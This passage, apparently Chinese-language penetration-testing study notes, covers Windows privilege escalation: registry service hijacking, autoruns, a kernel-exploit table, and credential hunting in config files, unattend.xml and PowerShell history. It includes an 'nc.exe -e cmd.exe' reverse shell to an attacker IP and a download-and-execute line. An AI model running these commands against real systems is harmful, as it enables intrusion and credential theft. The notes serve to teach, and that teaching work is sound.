<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> &quot;<span class="title">mrb3n</span>&quot; -<span class="title">kvuqsw</span> <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">ModelManagerService</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br></pre></td></tr></table></figure>

<p>利用<code>Set-ItemProperty</code>来更改该<code>ImagePath</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name &quot;ImagePath&quot; -Value &quot;C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Modifiable-Registry-Autorun-Binary"><a href="#Modifiable-Registry-Autorun-Binary" class="headerlink" title="Modifiable Registry Autorun Binary"></a>Modifiable Registry Autorun Binary</h2><p>使用 WMIC 查看系统启动时运行的程序。假设对给定二进制文件的注册表具有写权限，或者可以覆盖列出的二进制文件。在这种情况下，可能能够在用户下次登录时将权限提升给另一个用户。</p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries">文章</a>和<a target="_blank" rel="noopener" href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2">网站</a>详细介绍了 Windows 系统上许多潜在的自动运行位置。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-CimInstance</span> Win32_StartupCommand | <span class="built_in">select</span> Name, command, Location, User |<span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">Name     : OneDrive</span><br><span class="line">command  : <span class="string">&quot;C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe&quot;</span> /background</span><br><span class="line">Location : HKU\S<span class="literal">-1-5-21-2374636737-2633833024-1808968233-1001</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : WINLPE<span class="literal">-WS01</span>\mrb3n</span><br><span class="line"></span><br><span class="line">Name     : Windscribe</span><br><span class="line">command  : <span class="string">&quot;C:\Program Files (x86)\Windscribe\Windscribe.exe&quot;</span> <span class="literal">-os_restart</span></span><br><span class="line">Location : HKU\S<span class="literal">-1-5-21-2374636737-2633833024-1808968233-1001</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : WINLPE<span class="literal">-WS01</span>\mrb3n</span><br><span class="line"></span><br><span class="line">Name     : SecurityHealth</span><br><span class="line">command  : %windir%\system32\SecurityHealthSystray.exe</span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br><span class="line"></span><br><span class="line">Name     : VMware User <span class="keyword">Process</span></span><br><span class="line">command  : <span class="string">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span> <span class="literal">-n</span> vmusr</span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br><span class="line"></span><br><span class="line">Name     : VMware VM3DService <span class="keyword">Process</span></span><br><span class="line">command  : <span class="string">&quot;C:\WINDOWS\system32\vm3dservice.exe&quot;</span> <span class="literal">-u</span></span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Kernel-vulnerability"><a href="#Kernel-vulnerability" class="headerlink" title="Kernel vulnerability"></a>Kernel vulnerability</h1><p>此<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability">网站</a>便于搜索有关 Microsoft 安全漏洞的详细信息。</p>
<p>Windows 操作系统已知的远程代码执行&#x2F;本地特权提升漏洞的详细表格，按服务包级别细分，从 Windows XP 到 Server 2016。</p>
<table>
<thead>
<tr>
<th>Base OS</th>
<th>XP</th>
<th></th>
<th></th>
<th></th>
<th>2003</th>
<th></th>
<th></th>
<th>Vista</th>
<th></th>
<th></th>
<th>2008</th>
<th></th>
<th>7</th>
<th></th>
<th>2008R2</th>
<th></th>
<th>8</th>
<th>8.1</th>
<th>2012</th>
<th>2012R2</th>
<th>10</th>
<th>2016</th>
</tr>
</thead>
<tbody><tr>
<td>Service Pack</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP3</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP0</td>
<td>SP1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS03-026</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS05-039</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-025</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-067</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-068</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-012</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-050</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-015</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-059</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-092</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-011</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-046</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-062</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-080</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-005</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-053</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-081</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-002</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-040</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-058</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-062</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-068</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-070</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-001</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-051</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-061</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-076</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-078</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-097</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>MS16-016</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-032</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-135</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>MS17-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>CVE-2017-0213: COM Aggregate Marshaler</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>Hot Potato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>SmashedPotato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
</tbody></table>
<hr>
<h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><p>在评估过程中，通常会在 Windows 工作站上遇到大量不同的应用程序和服务。</p>
<p>枚举已安装的应用程序</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">product</span> <span class="title">get</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Name</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.28.29910</span></span><br><span class="line"><span class="function"><span class="title">Update</span> <span class="title">for</span> <span class="title">Windows</span> 10 <span class="title">for</span> <span class="title">x64</span>-<span class="title">based</span> <span class="title">Systems</span> (<span class="title">KB4023057</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">VMware</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Druva</span> <span class="title">inSync</span> 6.6.3</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Update</span> <span class="title">Health</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.28.29910</span></span><br><span class="line"><span class="function"><span class="title">Update</span> <span class="title">for</span> <span class="title">Windows</span> 10 <span class="title">for</span> <span class="title">x64</span>-<span class="title">based</span> <span class="title">Systems</span> (<span class="title">KB4480730</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br></pre></td></tr></table></figure>

<p>找到输出的应用程序，搜索漏洞，并尽可能的利用。</p>
<hr>
<h1 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h1><p><code>DLL injection</code>是一种将一段代码（结构化为动态链接库 (DLL)）插入正在运行的进程的方法。此技术允许插入的代码在进程的上下文中运行，从而影响其行为或访问其资源。</p>
<p><code>DLL injection</code>将恶意代码插入受信任的进程，在逃避安全软件检测方面特别有效。</p>
<p>待办</p>
<hr>
<h1 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h1><h2 id="Find-File"><a href="#Find-File" class="headerlink" title="Find File"></a>Find File</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; findstr /SIM /C:<span class="string">&quot;password&quot;</span> *.txt *.ini *.cfg *.config *.xml</span><br></pre></td></tr></table></figure>

<h3 id="词典文件"><a href="#词典文件" class="headerlink" title="词典文件"></a>词典文件</h3><p>Chrome 词典文件，密码等敏感信息可能会被输入到电子邮件客户端或基于浏览器的应用程序中，这些应用程序会用下划线标记无法识别的任何单词。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> <span class="string">&#x27;C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt&#x27;</span> | <span class="built_in">Select-String</span> password</span><br><span class="line"></span><br><span class="line">Password1234!</span><br></pre></td></tr></table></figure>

<h3 id="无人值守安装的文件"><a href="#无人值守安装的文件" class="headerlink" title="无人值守安装的文件"></a>无人值守安装的文件</h3><p>无人值守安装文件可能会定义自动登录设置或作为安装的一部分要创建的附加帐户。其中的密码以纯文本或 base64 编码形式存储。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">unattend</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:unattend&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span> <span class="attr">pass</span>=<span class="string">&quot;specialize&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span> <span class="attr">publicKeyToken</span>=<span class="string">&quot;31bf3856ad364e35&quot;</span> <span class="attr">language</span>=<span class="string">&quot;neutral&quot;</span> <span class="attr">versionScope</span>=<span class="string">&quot;nonSxS&quot;</span> <span class="attr">xmlns:wcm</span>=<span class="string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AutoLogon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Password</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Value</span>&gt;</span>local_4dmin_p@ss<span class="tag">&lt;/<span class="name">Value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">PlainText</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PlainText</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">LogonCount</span>&gt;</span>2<span class="tag">&lt;/<span class="name">LogonCount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Administrator<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">AutoLogon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ComputerName</span>&gt;</span>*<span class="tag">&lt;/<span class="name">ComputerName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><h3 id="PowerShell-历史文件"><a href="#PowerShell-历史文件" class="headerlink" title="PowerShell 历史文件"></a>PowerShell 历史文件</h3><p>从 Windows 10 中的 Powershell 5.0 开始，PowerShell 将命令历史记录存储到文件中：<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
<p>查询 PowerShell 历史记录保存路径</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br><span class="line"></span><br><span class="line">C:\Users\htb<span class="literal">-student</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p>读取 PowerShell 历史文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cd</span> Temp</span><br><span class="line"><span class="built_in">md</span> backups</span><br><span class="line"><span class="built_in">cp</span> c:\inetpub\wwwroot\* .\backups\</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="operator">-bor</span> <span class="number">3072</span>; <span class="built_in">iex</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1&#x27;</span>))</span><br><span class="line">. .\<span class="built_in">Get-IISsite</span>.ps1</span><br><span class="line"><span class="built_in">Get-IISsite</span> <span class="literal">-Server</span> WEB02 <span class="literal">-web</span> <span class="string">&quot;Default Web Site&quot;</span></span><br><span class="line">wevtutil qe Application <span class="string">&quot;/q:*[Application [(EventID=3005)]]&quot;</span> /f:text /<span class="built_in">rd</span>:true /u:WEB02\administrator /p:<span 